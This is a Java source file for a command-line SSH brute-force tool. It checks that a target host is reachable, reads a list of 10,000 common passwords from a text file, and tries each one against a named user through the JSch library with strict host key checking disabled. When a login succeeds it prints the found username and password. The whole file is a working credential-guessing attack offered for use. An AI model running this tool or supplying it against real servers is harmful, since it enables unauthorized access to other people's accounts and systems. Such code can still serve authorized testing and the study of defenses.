import java.io.File;
import java.io.FileNotFoundException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;
//jcraft must be downloaded separate 
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.Session;


public class sshBrute {
    public static void checkHost(String host, int port){
        /*
        Checks to see if the given ip/port combination is accessable 
        */
        try {
            System.out.println("Checking host...");
            Socket checkSock = new Socket();
            checkSock.connect(new InetSocketAddress(host, port), 1000); //connecting to SSH
            System.out.println("Valid Host - Connected");
        } catch (Exception e) {
            System.out.println("Invalid Host - Not Connected");
            System.exit(1);
        }
    }

    public static ArrayList<String> createPasswordList() throws FileNotFoundException {
        /*
        Creates password list from a txt file of the 10,000 most commond passwords
        */
        System.out.println("creating password list...");
        ArrayList<String> passwordList = new ArrayList<String>();
        Scanner scanner = new Scanner(new File("CommonPasswords.txt"));
        try {
            while (scanner.hasNext()) {
                passwordList.add(scanner.next());
            }
            System.out.println("finished creating password list");
        } catch (Exception e) {
            System.out.println("failed creating password list");
        } 
        return passwordList;
    }
    
    public static boolean crackPassword(String host, String user, String pass, int port) {
        /*
        Attempting to login to specific user with a given password
        */
        try {
            Session tryPassword = new JSch().getSession(user, host, port);
            tryPassword.setPassword(pass);
            tryPassword.setConfig("StrictHostKeyChecking", "no");
            tryPassword.connect(30000);
            tryPassword.disconnect();
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    public static void main(String[] args) throws FileNotFoundException {
        if (args.length != 2) { //if the target IP and username are not listed, print instructions
            System.out.println("usage: ./sshBrute.jar [TARGET[:PORT]] [USERNAME]");
            System.exit(1);
        }
        String targetIP;
        int targetPort;
        if (args[0].contains(":")) {
            targetIP = args[0].split(":")[0];
            targetPort = Integer.parseInt(args[0].split(":")[1]);
        }
        else {
            targetIP = args[0];
            targetPort = 22; //default ssh port is 22 if the admin does not manually change it
        }
        checkHost(targetIP, targetPort);
        String user = args[1];
        ArrayList<String> wordList = createPasswordList();
        System.out.println(String.format("cracking SSH pass for user \"%s\" at %s... \n", user, targetIP));
        for (int i = 0; i < wordList.size(); i++){ //runs through common password list and attempts to login with each password
            System.out.println("Attempting login with password: " + wordList.get(i));
            if (crackPassword(targetIP, user, wordList.get(i), targetPort)) { //if the password is correct print the user info
                System.out.println("creds found:");
                System.out.println(String.format("\tuser: %s", user));
                System.out.println(String.format("\tpass: %s", wordList.get(i)));
                System.exit(0);
            }
        }
        System.out.println("bruteforce failed");
    }
}
